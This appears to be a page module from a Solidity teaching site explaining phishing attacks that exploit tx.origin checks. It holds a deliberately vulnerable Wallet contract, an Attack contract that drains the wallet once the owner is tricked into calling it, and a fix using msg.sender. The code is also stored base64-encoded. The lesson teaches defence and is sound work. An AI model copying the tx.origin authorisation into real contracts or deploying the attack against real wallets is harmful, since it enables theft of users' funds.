// metadata
export const version = "0.8.17"
export const title = "Phishing with tx.origin"
export const description = "An example of phishing with tx.origin in Solidity"
export const codes = [
  {
    fileName: "TxOrigin.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xNzsKCi8qCldhbGxldCBpcyBhIHNpbXBsZSBjb250cmFjdCB3aGVyZSBvbmx5IHRoZSBvd25lciBzaG91bGQgYmUgYWJsZSB0byB0cmFuc2ZlcgpFdGhlciB0byBhbm90aGVyIGFkZHJlc3MuIFdhbGxldC50cmFuc2ZlcigpIHVzZXMgdHgub3JpZ2luIHRvIGNoZWNrIHRoYXQgdGhlCmNhbGxlciBpcyB0aGUgb3duZXIuIExldCdzIHNlZSBob3cgd2UgY2FuIGhhY2sgdGhpcyBjb250cmFjdAoqLwoKLyoKMS4gQWxpY2UgZGVwbG95cyBXYWxsZXQgd2l0aCAxMCBFdGhlcgoyLiBFdmUgZGVwbG95cyBBdHRhY2sgd2l0aCB0aGUgYWRkcmVzcyBvZiBBbGljZSdzIFdhbGxldCBjb250cmFjdC4KMy4gRXZlIHRyaWNrcyBBbGljZSB0byBjYWxsIEF0dGFjay5hdHRhY2soKQo0LiBFdmUgc3VjY2Vzc2Z1bGx5IHN0b2xlIEV0aGVyIGZyb20gQWxpY2UncyB3YWxsZXQKCldoYXQgaGFwcGVuZWQ/CkFsaWNlIHdhcyB0cmlja2VkIGludG8gY2FsbGluZyBBdHRhY2suYXR0YWNrKCkuIEluc2lkZSBBdHRhY2suYXR0YWNrKCksIGl0CnJlcXVlc3RlZCBhIHRyYW5zZmVyIG9mIGFsbCBmdW5kcyBpbiBBbGljZSdzIHdhbGxldCB0byBFdmUncyBhZGRyZXNzLgpTaW5jZSB0eC5vcmlnaW4gaW4gV2FsbGV0LnRyYW5zZmVyKCkgaXMgZXF1YWwgdG8gQWxpY2UncyBhZGRyZXNzLAppdCBhdXRob3JpemVkIHRoZSB0cmFuc2Zlci4gVGhlIHdhbGxldCB0cmFuc2ZlcnJlZCBhbGwgRXRoZXIgdG8gRXZlLgoqLwoKY29udHJhY3QgV2FsbGV0IHsKICAgIGFkZHJlc3MgcHVibGljIG93bmVyOwoKICAgIGNvbnN0cnVjdG9yKCkgcGF5YWJsZSB7CiAgICAgICAgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgfQoKICAgIGZ1bmN0aW9uIHRyYW5zZmVyKGFkZHJlc3MgcGF5YWJsZSBfdG8sIHVpbnQgX2Ftb3VudCkgcHVibGljIHsKICAgICAgICByZXF1aXJlKHR4Lm9yaWdpbiA9PSBvd25lciwgIk5vdCBvd25lciIpOwoKICAgICAgICAoYm9vbCBzZW50LCApID0gX3RvLmNhbGx7dmFsdWU6IF9hbW91bnR9KCIiKTsKICAgICAgICByZXF1aXJlKHNlbnQsICJGYWlsZWQgdG8gc2VuZCBFdGhlciIpOwogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgYWRkcmVzcyBwYXlhYmxlIHB1YmxpYyBvd25lcjsKICAgIFdhbGxldCB3YWxsZXQ7CgogICAgY29uc3RydWN0b3IoV2FsbGV0IF93YWxsZXQpIHsKICAgICAgICB3YWxsZXQgPSBXYWxsZXQoX3dhbGxldCk7CiAgICAgICAgb3duZXIgPSBwYXlhYmxlKG1zZy5zZW5kZXIpOwogICAgfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyB7CiAgICAgICAgd2FsbGV0LnRyYW5zZmVyKG93bmVyLCBhZGRyZXNzKHdhbGxldCkuYmFsYW5jZSk7CiAgICB9Cn0K",
  },
]

const html = `<h3 id="whats-the-difference-between-msgsender-and-txorigin">What&#39;s the difference between <code>msg.sender</code> and <code>tx.origin</code>?</h3>
<p>If contract A calls B, and B calls C, in C <code>msg.sender</code> is B and <code>tx.origin</code> is A.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p>A malicious contract can deceive the owner of a contract into calling a
function that only the owner should be able to call.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.17;</span>

<span class="hljs-comment">/*
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let&#x27;s see how we can hack this contract
*/</span>

<span class="hljs-comment">/*
1. Alice deploys Wallet with 10 Ether
2. Eve deploys Attack with the address of Alice&#x27;s Wallet contract.
3. Eve tricks Alice to call Attack.attack()
4. Eve successfully stole Ether from Alice&#x27;s wallet

What happened?
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice&#x27;s wallet to Eve&#x27;s address.
Since tx.origin in Wallet.transfer() is equal to Alice&#x27;s address,
it authorized the transfer. The wallet transferred all Ether to Eve.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Wallet</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">tx</span>.<span class="hljs-built_in">origin</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> owner, <span class="hljs-string">"Not owner"</span>);

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> <span class="hljs-keyword">public</span> owner;
    Wallet wallet;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Wallet _wallet</span>) </span>{
        wallet <span class="hljs-operator">=</span> Wallet(_wallet);
        owner <span class="hljs-operator">=</span> <span class="hljs-keyword">payable</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        wallet.<span class="hljs-built_in">transfer</span>(owner, <span class="hljs-keyword">address</span>(wallet).<span class="hljs-built_in">balance</span>);
    }
}
</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<p>Use <code>msg.sender</code> instead of <code>tx.origin</code></p>
<pre><code class="language-solidity"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint256</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
  <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> owner, <span class="hljs-string">"Not owner"</span>);

  (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> _to.<span class="hljs-built_in">call</span>{ <span class="hljs-built_in">value</span>: _amount }(<span class="hljs-string">""</span>);
  <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
}
</code></pre>
`

export default html
